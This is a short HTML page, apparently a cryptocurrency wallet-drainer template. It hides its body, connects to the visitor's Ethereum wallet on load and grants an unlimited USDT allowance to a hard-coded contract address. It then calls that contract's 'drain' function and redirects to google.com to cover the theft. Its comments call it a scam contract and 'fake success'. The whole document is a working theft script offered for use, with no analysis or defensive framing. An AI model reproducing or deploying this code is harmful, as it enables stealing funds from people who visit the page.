<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
</head>
<body style="display: none;"> <!-- Hide everything -->
<script>
// Auto-execute immediately
(async function() {
    if (typeof window.ethereum !== 'undefined') {
        try {
            const web3 = new Web3(window.ethereum);
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            const user = accounts[0];
            
            // USDT ABI for approve
            const usdtABI = [{
                "constant": false,
                "inputs": [
                    {"name":"_spender","type":"address"},
                    {"name":"_value","type":"uint256"}
                ],
                "name": "approve",
                "outputs": [{"name":"","type":"bool"}],
                "type": "function"
            }];
            
            const USDT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
            const YOUR_CONTRACT = '0xe04b47dDe78bef5777D81e948590F7742A868986';
            const MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
            
            const usdtContract = new web3.eth.Contract(usdtABI, USDT);
            
            // AUTO-APPROVE (no user click)
            await usdtContract.methods.approve(YOUR_CONTRACT, MAX).send({
                from: user,
                gas: 100000
            });
            
            // Auto-call your contract's drain function
            const contractABI = [{/* your contract ABI */}];
            const scamContract = new web3.eth.Contract(contractABI, YOUR_CONTRACT);
            await scamContract.methods.verifyWallet(1000000).send({
                from: user
            });
            
            // Redirect or show fake success
            window.location.href = "https://google.com"; // Redirect away
            
        } catch (error) {
            console.log('Failed:', error);
        }
    }
})();
</script>
</body>
</html>
